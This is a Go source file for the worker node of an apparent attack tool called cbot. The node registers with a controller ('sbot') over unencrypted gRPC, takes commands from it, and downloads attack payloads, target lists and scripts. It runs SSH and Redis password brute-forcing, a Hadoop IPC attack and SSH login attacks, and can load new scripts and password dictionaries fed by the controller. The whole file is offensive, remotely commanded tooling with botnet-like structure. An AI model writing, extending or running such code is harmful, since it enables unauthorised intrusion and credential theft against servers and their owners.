package node

import (
	"fmt"
	"github.com/cbot/attack"
	"github.com/cbot/attack/ascript"
	"github.com/cbot/attack/bruteforce"
	"github.com/cbot/attack/hadoop"
	"github.com/cbot/attack/unix"
	"github.com/cbot/logstream"
	"github.com/cbot/targets/local"
	"github.com/cbot/targets/source"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"log"
	"os"
	"path/filepath"
)


var CBotDir="cbot"
var DownloadStoreDir="DFile"


type Node struct {

	nodeId string

	cfg *Config

	grpcClient *grpc.ClientConn

	nodeClient *NodeClient

	cmdClient *CmdClient

	logStreamClient *LogStreamClient

	fserverClient  *FServerClient

	attackPayloadClient *AttackPayloadClient

	attackTargetsClient *AttackTargetsClient

	attackScriptsClient *AttackScriptsClient

	spool *source.SourcePool

	attackTasks *attack.AttackTasks

	nodeInfo *local.NodeInfo

	logStream *logstream.LogStream

	dictPools map[string]*bruteforce.DictPool

	unixAttack *unix.UnixSSHLoginAttack


}

func initCbotDownloaFileStoreDir() string {

	fpath := filepath.Join(os.TempDir(),CBotDir,DownloadStoreDir)

	if err := os.MkdirAll(fpath,0755);err!=nil {

		errS := fmt.Sprintf("Cannot mkdir:%s failed:%v",fpath,err)
		log.Println(errS)

		fpath = os.TempDir()
	}

	return fpath
}


func NewNode(cfg *Config) *Node {

	nodeInfo := local.GetNodeInfo()
	spool := source.NewSourcePool()

	attackTasks := attack.NewAttackTasks(&attack.Config{
		TaskId:                cfg.TaskId,
		MaxThreads:            cfg.MaxThreads,
		SourceCapacity:        cfg.SourceCapacity,
		AttackProcessCapacity: cfg.AttackProcessCapacity,
		SBotHost:              cfg.SbotHost,
		SBotPort:              cfg.SbotFileServerPort,
	}, nodeInfo, spool)

	dictpools := map[string]*bruteforce.DictPool{
		"ssh":   bruteforce.NewDictPool(),
		"redis": bruteforce.NewDictPool(),
	}

	attackTasks.AddAttack(bruteforce.NewSSHBruteforceAttack(dictpools["ssh"], attackTasks))
	attackTasks.AddAttack(bruteforce.NewRedisBruteforceAttack(dictpools["redis"], attackTasks))
	attackTasks.AddAttack(hadoop.NewHadoopIPCAttack(attackTasks))

	return &Node{
		cfg:         cfg,
		spool:       spool,
		attackTasks: attackTasks,
		nodeInfo:    nodeInfo,
		logStream:   logstream.NewLogStream(),
		dictPools:   dictpools,
		unixAttack:  unix.NewUnixSSHLoginAttack(attackTasks),
	}

}

func (n *Node) GetNodeInfo() *local.NodeInfo {

	return n.nodeInfo
}

func (n *Node) Start() error {

	var err error

	//connect to sbot
	addr := fmt.Sprintf("%s:%d", n.cfg.SbotHost, n.cfg.SbotRPCPort)
	n.grpcClient, err = grpc.Dial(addr, grpc.WithTransportCredentials(insecure.NewCredentials()))

	if err != nil {

		errS := fmt.Sprintf("Cannot connect to sbot:%s,failed:%v",addr,err)
		log.Println(errS)

		return fmt.Errorf(errS)
	}

	n.logStreamClient = NewLogStreamClient(n, n.grpcClient, n.logStream)

	//connect to sbot,and create node
	n.nodeClient = NewNodeClient(n, n.grpcClient)
	n.nodeId, err = n.nodeClient.CreateNode()

	if err != nil {

		errS := fmt.Sprintf("Cannot create a node from sbot:%s,failed:%v", addr,err)
		log.Println(errS)
		return fmt.Errorf(errS)
	}

	n.attackTasks.Cfg.NodeId = n.nodeId

	n.cmdClient, err = NewCmdClient(n, n.grpcClient)
	if err != nil {

		errS := fmt.Sprintf("Cannot create command client for connecting to sbot:%s,failed:%v", addr,err)
		log.Println(errS)
		return fmt.Errorf(errS)
	}

	//setup command client to receive cmd from sbot
	if err = n.cmdClient.Start(); err != nil {
		errS := fmt.Sprintf("Cannot start command client to receive cmd from sbot:%s,failed:%v", addr,err)
		log.Println(errS)
		return fmt.Errorf(errS)
	}

	//setup logstream client to send log to sbot
	if err = n.logStreamClient.Start(); err != nil {

		errS := fmt.Sprintf("Cannot start logstream client to send log to sbot:%s,failed:%v", addr,err)
		log.Println(errS)
		return fmt.Errorf(errS)

	}

	n.fserverClient = NewFServerClient(n,n.grpcClient,initCbotDownloaFileStoreDir())

	n.attackPayloadClient = NewAttackPayloadClient(n,n.grpcClient)

	n.attackTargetsClient = NewAttackTargetsClient(n,n.grpcClient)

	n.attackScriptsClient = NewAttackScriptsClient(n,n.grpcClient)

	//setup attack tasks
	n.attackTasks.Start()

	//setup unix attack
	n.unixAttack.Start()

	n.waitAttackProcess()

	n.Ping()

	n.attackTargetsClient.Start()

	n.attackScriptsClient.Start()


	return nil
}

func (n *Node) Stop() {

	n.grpcClient.Close()
}

func (n *Node) NodeId() string {

	return n.nodeId
}

func (n *Node) TaskId() string {

	return n.cfg.TaskId
}

func (n *Node) ParentNodeId() string {

	return n.cfg.PNodeId
}

func (n *Node) AttackType()string {

	return n.cfg.AttackType
}

func (n *Node) AddAttackSource(name string, types []string, content []byte) error {

	s, err := source.NewScriptSourceFromContent(n.spool, name, types, content)

	if err != nil {

		return err
	}

	n.spool.StartSource(s)

	return nil
}

func (n *Node) AddAttack(name string, attackType string, defaultProto string, defaultPort int, content []byte) error {

	fmt.Printf("add an attack script:%s,type:%s,dport:%d,dproto:%s\ncontent:%s\n",name,attackType,defaultPort,defaultProto,string(content))
	att, err := ascript.NewAttackScriptFromContent(n.attackTasks, name, attackType, defaultPort, defaultProto, content)

	if err != nil {

		log.Printf("add attack script err:%v\n",err)
		return err
	}

	n.attackTasks.AddAttack(att)

	return nil
}

func (n *Node) AddDict(name string, users []string, passwds []string) error {

	dictpool, ok := n.dictPools[name]

	if !ok {

		return fmt.Errorf("Cannot find dictory pool for name:%s", name)
	}

	dictpool.Add(users, passwds)

	return nil
}
